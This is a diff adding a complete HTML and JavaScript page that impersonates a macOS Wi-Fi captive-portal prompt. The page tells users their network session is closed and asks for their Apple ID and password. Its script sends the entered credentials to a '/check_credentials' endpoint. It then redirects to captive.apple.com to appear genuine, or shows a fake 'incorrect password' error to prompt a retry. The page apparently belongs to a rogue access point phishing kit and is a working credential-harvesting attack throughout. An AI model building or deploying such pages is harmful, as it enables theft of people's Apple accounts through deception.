@@ -1,0 +1,153 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="chrome-offline.css" type="text/css">
+    <link rel="stylesheet" href="mac-network-manager.css" type="text/css">
+    <script type="text/javascript" src="jquery.min.js"></script>
+    <title>Failed to open page</title>
+</head>
+<body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+<div id="main-frame-error" class="interstitial-wrapper">
+    <div id="loader-mac">
+        <div class="mac-wifi" id="mac-wifi" style="display: none;">
+            <div id="modal-title" class="title"></div>
+            <div class="content">
+                <div class="icon"><img src="lock.png" alt="WiFi signal" class="lock-icon" width="65"></div>
+                <div class="description">
+                    <div id="wifi-search-unit">
+                        <strong>Your network session is closed to continue sign in with your Apple&nbsp;ID.</strong>
+                        <info id="info">Enter your Apple&nbsp;ID and password.</info>
+                        <div id="apple-id-unit" class="apple-id"><label>Apple ID:</label>
+                            <input id="apple-id-login" name="login" type="text" autofocus>
+                            <div class="glow"></div>
+                        </div>
+                        <div id="password-unit" class="password"><label>Password:</label>
+                            <input id="apple-id-pass" name="password" type="password">
+                            <div class="glow"></div>
+                        </div>
+                        <div id="buttons-unit" class="buttons">
+                            <button id="button-join" class="action" onclick="javascript:CheckCreds();">Sign in</button>
+                            <button id="button-cancel">Cancel</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        $('#apple-id-login').mouseover(function() {
+            if ($('#apple-id-login').is(":focus")) {
+                $('#apple-id-login').attr("placeholder", "");
+            }
+        });
+
+        $('#apple-id-login').mouseout(function() {
+            var empty = $('#apple-id-login').attr('empty');
+            if (empty == "true") {
+                $('#apple-id-login').attr("placeholder", "Required");
+            }
+        });
+
+        $('#apple-id-pass').mouseover(function() {
+            if ($('#apple-id-pass').is(":focus")) {
+                $('#apple-id-pass').attr("placeholder", "");
+            }
+        });
+
+        $('#apple-id-pass').mouseout(function() {
+            var empty = $('#apple-id-pass').attr('empty');
+            if (empty == "true") {
+                $('#apple-id-pass').attr("placeholder", "Required");
+            }
+        });
+
+        function CheckCreds() {
+            var username = document.getElementsByName('login')[0].value
+            var password = document.getElementsByName('password')[0].value
+
+            if (username == "" || password == "") {
+                if (password == "") {
+                    $('#apple-id-pass').focus();
+                    $('#apple-id-pass').attr("placeholder", "Required");
+                    $('#apple-id-pass').attr("empty", "true");
+                }
+                if (username == "") {
+                    $('#apple-id-login').focus();
+                    $('#apple-id-login').attr("placeholder", "Required");
+                    $('#apple-id-pass').attr("empty", "true");
+                }
+            }
+            else {
+                StartWait();
+                var result = "";
+                var xhr = new XMLHttpRequest();
+                var data = {"username": username, "password": password};
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == XMLHttpRequest.DONE) {
+                        result = xhr.responseText;
+                        StopWait();
+                        if (result == "ERROR") {
+                            Error();
+                        }
+                        else if (result == "OK") {
+                            window.location.href = "http://captive.apple.com/success.html";
+                        }
+                        else {
+                            Error();
+                        }
+                    }
+                }
+
+                xhr.open("POST", '/check_credentials', false);
+                xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+                xhr.send(JSON.stringify(data));
+            }
+        }
+
+        function StartWait() {
+            var button = document.getElementById("button-join");
+            document.getElementById("apple-id-unit").style.opacity = .5;
+            document.getElementById("password-unit").style.opacity = .5;
+            document.getElementById("buttons-unit").style.opacity = .5;
+            button.style.color = "black";
+            button.style.backgroundImage="none";
+            button.style.border="1px solid #c5c5c5";
+        }
+
+        function StopWait() {
+            var button = document.getElementById("button-join");
+            $(button).delay(800);
+            document.getElementById("apple-id-unit").style.opacity = 1;
+            document.getElementById("password-unit").style.opacity = 1;
+            document.getElementById("buttons-unit").style.opacity = 1;
+            button.style.color = "white";
+            button.style.backgroundImage="linear-gradient(#6cb3fa, #0a7eff)";
+            button.style.border="1px solid #74aafd";
+        }
+
+        function Error() {
+            var div = document.getElementById('mac-wifi');
+            var start_position = parseInt($(div).css('left'), 10);
+            var interval = 70;
+            var distance = 10;
+            var times = 4;
+
+            $(div).css('position', 'absolute');
+
+            for (var iter = 0; iter < (times + 1) ; iter++) {
+                $(div).animate({
+                    left: start_position + ((iter % 2 == 0 ? distance : distance * -1))
+                }, interval);
+            }                                                                                                          
+            $(div).animate({ left: start_position }, interval);
+
+            $('#info').html("Your Apple&nbsp;ID or password was incorrect.");
+            $('#apple-id-pass').focus();
+        }
+    </script>
+    <script src="behavior.js"></script>
+</div>
+</body>
+</html>
